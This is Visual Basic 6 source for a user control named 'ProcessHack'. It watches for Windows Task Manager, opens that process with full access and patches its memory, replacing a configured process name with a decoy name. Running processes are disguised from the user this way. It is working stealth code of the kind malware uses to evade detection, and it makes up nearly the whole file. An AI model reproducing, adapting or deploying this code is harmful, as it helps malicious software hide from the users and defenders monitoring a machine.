VERSION 5.00
Begin VB.UserControl ProcessHack 
   BackColor       =   &H00FFC0C0&
   ClientHeight    =   3600
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4800
   ScaleHeight     =   3600
   ScaleWidth      =   4800
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   585
      Top             =   435
   End
End
Attribute VB_Name = "ProcessHack"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function FormatMessage Lib "kernel32" Alias "FormatMessageA" (ByVal dwFlags As Long, lpSource As Any, ByVal dwMessageId As Long, ByVal dwLanguageId As Long, ByVal lpBuffer As String, ByVal nSize As Long, Arguments As Long) As Long
Private Declare Function GetLastError Lib "kernel32" () As Long

Private Const FORMAT_MESSAGE_ALLOCATE_BUFFER = &H100
Private Const FORMAT_MESSAGE_FROM_SYSTEM = &H1000

Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long

Private Const TH32CS_SNAPPROCESS As Long = 2&

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * 260
End Type

Private myHandle As Long
Private myproclist$

Public i_HostProcess As String
Public i_NewHostIdentity As String
Public i_NewHostProcess As String

Public Event Status(Percent As Integer, CurrentStep As Integer, TotalSteps As Integer)

Private Function UNICODE(PREREP As String)
REPIT$ = ""
For p = 1 To Len(PREREP)
REPIT$ = REPIT$ & Chr(0) & Mid(PREREP, p, 1)
Next p
UNICODE = REPIT$
End Function

Private Function InitProcHack(pid As Long)
pHandle = OpenProcess(&H1F0FFF, False, pid)
If (pHandle = 0) Then
    InitProcHack = False
    myHandle = 0
Else
    InitProcHack = True
    myHandle = pHandle
End If
End Function

Public Sub Timer3_Timer()
Timer3.Enabled = False
    If taskmgrFrozen = False Then
          newproclist$ = ""
          Dim myProcess As PROCESSENTRY32
          Dim mySnapshot As Long
          myProcess.dwSize = Len(myProcess)
          mySnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
          ProcessFirst mySnapshot, myProcess
          If InStr(1, myproclist$, "[" & myProcess.th32ProcessID & "]") = 0 Then
              If Left(myProcess.szexeFile, InStr(myProcess.szexeFile, Chr(0)) - 1) = "taskmgr.exe" Then
                  REPSTRINGINPROC myProcess.th32ProcessID, 1
                  'REPSTRINGINPROC myProcess.th32ProcessID, 0
              End If
          End If
          newproclist$ = "[" & myProcess.th32ProcessID & "]"
          While ProcessNext(mySnapshot, myProcess)
              If InStr(1, myproclist$, "[" & myProcess.th32ProcessID & "]") = 0 Then
                  If Left(myProcess.szexeFile, InStr(myProcess.szexeFile, Chr(0)) - 1) = "taskmgr.exe" Then
                          REPSTRINGINPROC myProcess.th32ProcessID, 1
                          'REPSTRINGINPROC myProcess.th32ProcessID, 0
                      End If
              End If
              newproclist$ = newproclist$ & "[" & myProcess.th32ProcessID & "]"
          Wend
          myproclist$ = newproclist$
    End If
  Timer3.Enabled = True
End Sub

Private Sub REPSTRINGINPROC(PIDX As Long, SHOWME As Integer)
If Not InitProcHack(PIDX) Then Exit Sub
    Dim c As Integer
    Dim addr As Long
    Dim buffer As String * 20016
    Dim readlen As Long
    Dim writelen As Long
If SHOWME = 1 Then
    SRCHSTRING = UNICODE(i_HostProcess)
    REPSTRING$ = UNICODE(i_NewHostIdentity)
        For addr = 0 To 4000
        Call ReadProcessMemory(myHandle, addr * 20000, buffer, 20016, readlen)
            If addr / 100 = Int(addr / 100) Then
            RaiseEvent Status(addr / 40, 1, 2)
            End If
            If readlen > 0 Then
              startpos = 1
              While InStr(startpos, buffer, SRCHSTRING) > 0
                p = (addr) * 20000 + InStr(startpos, buffer, SRCHSTRING) - 1
                Call WriteProcessMemory(myHandle, CLng(p), REPSTRING$, Len(REPSTRING$), bytewrite)
                startpos = InStr(startpos, buffer, Trim(SRCHSTRING)) + 1
              Wend
            End If
            DoEvents
        Next addr
End If

SRCHSTRING = UNICODE(i_NewHostProcess)
REPSTRING$ = UNICODE(i_HostProcess)
    For addr = 0 To 4000
            If addr / 100 = Int(addr / 100) Then
            RaiseEvent Status(addr / 40, 2, 2)
            End If
    Call ReadProcessMemory(myHandle, addr * 20000, buffer, 20016, readlen)
        If readlen > 0 Then
          startpos = 1
          While InStr(startpos, buffer, SRCHSTRING) > 0
            p = (addr) * 20000 + InStr(startpos, buffer, SRCHSTRING) - 1
            Call WriteProcessMemory(myHandle, CLng(p), REPSTRING$, Len(REPSTRING$), bytewrite)
            startpos = InStr(startpos, buffer, Trim(SRCHSTRING)) + 1
          Wend
        End If
        DoEvents
    Next addr
    Close #1
End Sub


Function Enable()
Timer3.Enabled = True
End Function
Function Disable()
Timer3.Enabled = False
End Function

